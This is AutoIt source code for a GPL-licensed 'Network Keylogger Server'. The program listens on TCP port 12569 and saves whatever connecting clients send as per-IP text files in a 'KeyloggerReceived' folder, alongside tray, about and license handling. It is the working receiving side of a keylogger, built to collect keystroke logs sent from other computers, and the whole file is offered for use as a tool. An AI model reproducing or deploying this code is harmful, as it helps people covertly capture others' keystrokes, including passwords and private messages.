#cs
	Network Keylogger Server v1.0.0.2
	Copyright © 2010 VittGam
	http://www.Net-Keylogger.VittGam.net/
	Net-Keylogger@VittGam.net

	License information:

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.
#ce

; Tested with AutoIt 3.3.6.0
#NoTrayIcon
#NoAutoIt3Execute
#include <Misc.au3>
#include "gpl.au3"
#include "tcp.au3"
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_icon=vittgam.ico
#AutoIt3Wrapper_outfile=network_keylogger_server.exe
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_Res_Comment=Network Keylogger Server v1.0.0.2 by VittGam
#AutoIt3Wrapper_Res_Description=Network Keylogger Server
#AutoIt3Wrapper_Res_Fileversion=1.0.0.2
#AutoIt3Wrapper_Res_LegalCopyright=Copyright © 2010 VittGam
#AutoIt3Wrapper_Res_Field=InternalName|network_keylogger_server
#AutoIt3Wrapper_Res_Field=ProductName|Network Keylogger Server
#AutoIt3Wrapper_Res_Field=CompanyName|VittGam (www.VittGam.net)
#AutoIt3Wrapper_Res_Field=ProductVersion|1.0.0.2
#AutoIt3Wrapper_Res_Field=OriginalFilename|network_keylogger_server.exe
#AutoIt3Wrapper_Res_SaveSource=n
#AutoIt3Wrapper_Res_Language=1033
#AutoIt3Wrapper_Res_requestedExecutionLevel=asInvoker
#AutoIt3Wrapper_Au3Check_Parameters=-d -w 1 -w 2 -w 3 -w 4 -w 5 -w 6
#AutoIt3Wrapper_Au3Check_Stop_OnWarning=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****

Global $listen_bind="0.0.0.0"
Global $listen_port="12569"

Opt("TrayMenuMode",1)
Opt("TrayOnEventMode",1)
Opt("GUIOnEventMode",1)
Global $prname="Network Keylogger Server"
Global $version="1.0.0.2"
Global $author="VittGam"
Global $title=$prname&" v"&$version&" by "&$author
Global $abouttext=$prname&" v"&$version&@LF&"Copyright © 2010 "&$author&@LF&"http://www.Net-Keylogger.VittGam.net/"&@LF&"Net-Keylogger@VittGam.net"& _
				@LF&@LF&"License information:"&@LF&@LF&"This program is free software: you can redistribute it and/or modify it under "& _
				"the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) "& _
				"any later version."&@LF&@LF&"This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied "& _
				"warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details."&@LF&@LF&"You should have "& _
				"received a copy of the GNU General Public License along with this program.  If not, see <http://www.gnu.org/licenses/>."
TCPStartup()
Global $licensegui=-1
If $CmdLine[0] > 0 Then
	If $CmdLine[1] = "aboutbox" Then
		AboutBox()
		Exit
	EndIf
EndIf
If $CmdLine[0] > 0 Then
	If $CmdLine[1] = "license" Then
		LicenseOpen()
		While WinExists($licensegui)
			Sleep(250)
		WEnd
		Exit
	EndIf
EndIf
If _Singleton("Global\"&$prname&"_"&$listen_bind&"_"&$listen_port,3) = 0 Then
	MsgBox(16,$title,"Cannot start two instances of the server listening on the same port and address.")
	Exit
EndIf
If DirCreate(@ScriptDir&"\KeyloggerReceived") = 0 Then
	MsgBox(16,$title,"Cannot create KeyloggerReceived folder: "&@ScriptDir&"\KeyloggerReceived.")
	Exit
EndIf
Global $running_app=-1
Global $about=TrayCreateItem("About")
TrayItemSetOnEvent($about,"About")
Global $license=TrayCreateItem("License")
TrayItemSetOnEvent($license,"License")
TrayCreateItem("")
Global $exit=TrayCreateItem("Exit")
TrayItemSetOnEvent($exit,"ExitFunc")
TraySetClick(8)
OnAutoItExitRegister("ExitFunc")
Global $sock1=_TCP_Server_Create($listen_port,$listen_bind)
If $sock1 = False Then
	MsgBox(16,$title,"Cannot initialize the server at "&$listen_bind&":"&$listen_port&".")
	Exit
EndIf
TraySetState(1)
TraySetToolTip($title&@LF&"Initializing...")
_TCP_RegisterEvent($sock1,$TCP_NEWCLIENT,"SNewClient")
_TCP_RegisterEvent($sock1,$TCP_DISCONNECT,"SDisconnect")
_TCP_RegisterEvent($sock1,$TCP_RECEIVE,"SReceive")
TrayToolTipUpdate()
TrayTip($title,"Initialized, listening at "&$listen_bind&":"&$listen_port,60,17)
While 1
	Sleep(1000)
WEnd
Func SNewClient($hSocket,$iError)
	$iError=$iError
	Assign("ip_"&$hSocket,_TCP_Server_ClientIP($hSocket),2)
	Assign("filename_"&$hSocket,@ScriptDir&"\KeyloggerReceived\received-"&Eval("ip_"&$hSocket)&"-"&Random(1000000,9999999,1)&".txt",2)
	TrayTip($title,"New connection from "&Eval("ip_"&$hSocket)&"! Saving in file "&Eval("filename_"&$hSocket)&@CRLF&"Active connections: "&TrayToolTipUpdate(),60,17)
EndFunc
Func SDisconnect($hSocket,$iError)
	$iError=$iError
	TrayTip($title,"Finished connection from "&Eval("ip_"&$hSocket)&", file saved as "&Eval("filename_"&$hSocket)&@CRLF&"Active connections: "&TrayToolTipUpdate(1),60,17)
	Assign("ip_"&$hSocket,"",2)
	Assign("filename_"&$hSocket,"",2)
EndFunc
Func SReceive($hSocket,$sReceived,$iError)
	$iError=$iError
	If Eval("filename_"&$hSocket) = "" Then
		_TCP_Server_DisconnectClient($hSocket)
	EndIf
	If $sReceived <> "" Then
		FileWrite(Eval("filename_"&$hSocket),$sReceived)
	EndIf
EndFunc
Func TrayToolTipUpdate($minus=0)
	Local $templist=_TCP_Server_ClientList()
	If $minus Then $templist[0]-=1
	TraySetToolTip($title&@LF&"Active connections: "&$templist[0])
	Return $templist[0]
EndFunc
Func ExitFunc()
	TrayItemSetState($exit,4)
	TraySetState(2)
	If $running_app <> -1 Then
		ProcessClose($running_app)
		$running_app=-1
	EndIf
	_TCP_Server_Stop()
	TCPShutdown()
	ProcessClose(@AutoItPID)
	Exit
EndFunc
Func About()
	TrayItemSetState($about,4)
	If $running_app <> -1 Then
		ProcessClose($running_app)
		$running_app=-1
	EndIf
	If @Compiled Then
		$running_app=Run(""""&@ScriptFullPath&""" aboutbox",@ScriptDir,@SW_HIDE,2)
	Else
		$running_app=Run(""""&@AutoItExe&""" """&@ScriptFullPath&""" aboutbox",@ScriptDir,@SW_HIDE,2)
	EndIf
EndFunc
Func License()
	TrayItemSetState($license,4)
	If $running_app <> -1 Then
		ProcessClose($running_app)
		$running_app=-1
	EndIf
	If @Compiled Then
		$running_app=Run(""""&@ScriptFullPath&""" license",@ScriptDir,@SW_HIDE,2)
	Else
		$running_app=Run(""""&@AutoItExe&""" """&@ScriptFullPath&""" license",@ScriptDir,@SW_HIDE,2)
	EndIf
EndFunc
Func AboutBox()
	MsgBox(64,"About "&$title,$abouttext)
EndFunc
Func LicenseOpen()
	If WinExists($licensegui) Then
		WinActivate($licensegui)
	Else
		$licensegui=GUICreate("License - "&$title,640,480,-1,-1,-2133917696)
		GUISetOnEvent(-3,"LicenseClose",$licensegui)
		Local $tmpcontrol=GUICtrlCreateEdit(GPL(),0,0,640,480,3147776)
		GUICtrlSetFont($tmpcontrol,10,400,0,"Lucida Console")
		GUISetState(@SW_SHOW,$licensegui)
		ControlSend($licensegui,"",$tmpcontrol,"^{HOME}")
	EndIf
EndFunc
Func LicenseClose()
	GUIDelete($licensegui)
EndFunc
